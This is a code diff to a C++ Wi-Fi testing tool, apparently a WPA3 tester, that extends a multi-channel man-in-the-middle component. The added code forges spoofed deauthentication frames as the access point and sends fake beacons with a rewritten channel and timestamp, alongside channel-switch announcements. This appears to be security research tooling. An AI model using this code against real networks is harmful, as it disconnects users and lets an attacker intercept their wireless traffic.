@@ -46,6 +46,37 @@ namespace wpa3_tester{
         return 0;
     }
 
+    void McMitm::send_fake_real_beacon_on_real_chan() const{
+        auto* fake = beacon_old->clone();
+
+        uint8_t ch = netconfig.rogue_channel;
+        fake->remove_option(Dot11::DS_SET);
+        fake->add_option({Dot11::DS_SET, 1, &ch});
+
+        const auto now_us = duration_cast<microseconds>(
+            steady_clock::now().time_since_epoch()).count();
+        fake->timestamp(now_us + 1000000); // +1 sekunda dopředu
+
+        RadioTap rt;
+        const int freq_mhz = hw_capabilities::channel_to_freq(netconfig.real_channel);
+        rt.channel(freq_mhz, RadioTap::OFDM);
+        rt.flags(RadioTap::FCS);
+        rt.inner_pdu(fake);
+        sender_real->send(rt, r_client_iface);
+    }
+
+    void McMitm::send_deauth_as_ap() const{
+        Dot11Deauthentication deauth;
+        deauth.addr1(client_mac);
+        deauth.addr2(ap_mac);
+        deauth.addr3(ap_mac);
+        deauth.reason_code(3);
+
+        RadioTap rt;
+        rt.inner_pdu(deauth);
+        sender_real->send(rt, r_client_iface);
+    }
+
     void McMitm::run(const int timeout_sec) {
         if (!sniffer_real || !sniffer_rogue) {
             log(LogLevel::ERROR, "Sniffers not initialized before run()");
@@ -57,8 +88,11 @@ namespace wpa3_tester{
         }
 
         probe_resp.reset(beacon_to_probe_resp(*beacon, netconfig.rogue_channel));
+        beacon_old.reset(beacon->clone());
         beacon.reset(beacon_channel_patch(*beacon, netconfig.rogue_channel));
 
+        send_deauth_as_ap();
+        usleep(100000);
         CSA_attack::send_CSA_beacon(ap_mac, r_client_iface, ssid, netconfig.real_channel, netconfig.rogue_channel, 1);
 
         last_real_beacon  = now_sec();
@@ -79,12 +113,12 @@ namespace wpa3_tester{
             auto try_sniff = [&](Sniffer& sniffer, void (McMitm::*handler)(PDU&)) {
                 const int fd = pcap_get_selectable_fd(sniffer.get_pcap_handle());
                 pollfd pfd = { .fd = fd, .events = POLLIN, .revents = 0 };
-                if (poll(&pfd, 1, 1) <= 0) return; //10ms
+                if (poll(&pfd, 1, 1) <= 0) return; //1ms
                 if (!(pfd.revents & POLLIN)) return;
 
                 pcap_pkthdr* header;
                 const u_char* frame;
-                while (pcap_next_ex(sniffer.get_pcap_handle(), &header, &frame) == 1) {
+                if (pcap_next_ex(sniffer.get_pcap_handle(), &header, &frame) == 1) {
                     try{
                         RadioTap rt_new(frame, header->caplen);
                         (this->*handler)(rt_new);
@@ -99,6 +133,8 @@ namespace wpa3_tester{
 
             if (next_beacon <= now_sec()) {
                 //CSA_attack::send_CSA_beacon(ap_mac, r_client_iface, ssid, netconfig.real_channel,  netconfig.rogue_channel, 1);
+
+                send_fake_real_beacon_on_real_chan();
 
                 RadioTap rt;
                 const auto now_us = duration_cast<microseconds>(steady_clock::now().time_since_epoch()).count();
@@ -200,14 +236,13 @@ namespace wpa3_tester{
         } else if (const auto* data = pdu.find_pdu<Dot11Data>()) {
             addr2 = data->addr2().to_string();
         } else {
-            //TPODO encrpypted
+            //TODO encrpypted
             // fallback – přečti addr2 přímo z raw bytes
-            const auto* rt = pdu.find_pdu<RadioTap>();
-            if (rt) {
+            if (pdu.find_pdu<RadioTap>()) {
                 const auto raw = pdu.serialize();
                 const uint16_t rt_len = raw[2] | (raw[3] << 8);
                 if (raw.size() >= rt_len + 16) {
-                    HWAddress<6> hw(raw.data() + rt_len + 10);
+                    const HWAddress<6> hw(raw.data() + rt_len + 10);
                     addr2 = hw.to_string();
                 }
             }
@@ -267,6 +302,7 @@ namespace wpa3_tester{
             RadioTap rt;
             rt.inner_pdu(probe_resp->clone());
             sender_rogue->send(rt);
+            sender_real->send(pdu, r_client_iface);
 
             log(LogLevel::INFO, "Replied ProbeResp to %s", addr2.c_str());
             return;
